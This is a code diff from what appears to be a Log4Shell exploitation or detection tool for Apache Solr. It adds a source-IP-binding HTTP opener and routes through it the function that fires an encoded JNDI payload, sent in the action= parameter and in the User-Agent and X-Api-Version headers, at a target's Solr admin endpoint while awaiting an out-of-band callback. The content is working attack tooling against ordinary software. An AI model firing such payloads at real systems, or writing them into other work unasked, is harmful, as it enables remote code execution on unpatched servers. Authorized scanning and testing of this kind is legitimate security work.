@@ -187,6 +187,28 @@ def _await_callback(bind_port, marker, result, stop):
     srv.close()
 
 
+def _urlopen_bound(req, ctx, timeout):
+    """urlopen that egress-binds to --source (ctx.source_ip) when one is set, so the
+    --active OOB fire honours the operator's chosen source IP like the curl legs do
+    (plain urllib.request.urlopen can't source-bind). Falls back to a normal urlopen
+    when no source is configured."""
+    import http.client
+    src = (getattr(ctx, "source_ip", None) or "").strip() if getattr(ctx, "source_ip", None) else None
+    if not src:
+        return urllib.request.urlopen(req, timeout=timeout)
+
+    class _BoundHTTPConnection(http.client.HTTPConnection):
+        def connect(self):
+            self.sock = socket.create_connection(
+                (self.host, self.port), self.timeout, source_address=(src, 0))
+
+    class _BoundHandler(urllib.request.HTTPHandler):
+        def http_open(self, r):
+            return self.do_open(_BoundHTTPConnection, r)
+
+    return urllib.request.build_opener(_BoundHandler).open(req, timeout=timeout)
+
+
 def _fire_oob(target, web_port, host, oob_port, marker, ctx):
     """Fire the ENCODED action= JNDI payload (the vector that actually reaches
     log4j on Solr) plus the UA/X-Api-Version headers, at the target. Returns a
@@ -197,7 +219,7 @@ def _fire_oob(target, web_port, host, oob_port, marker, ctx):
     url = "http://%s:%d/solr/admin/cores?%s" % (target, web_port, qs)
     headers = {"User-Agent": payload, "X-Api-Version": payload}
     try:
-        with urllib.request.urlopen(urllib.request.Request(url, headers=headers), timeout=6) as resp:
+        with _urlopen_bound(urllib.request.Request(url, headers=headers), ctx, 6) as resp:
             code = resp.getcode()
     except urllib.error.HTTPError as e:
         code = e.code
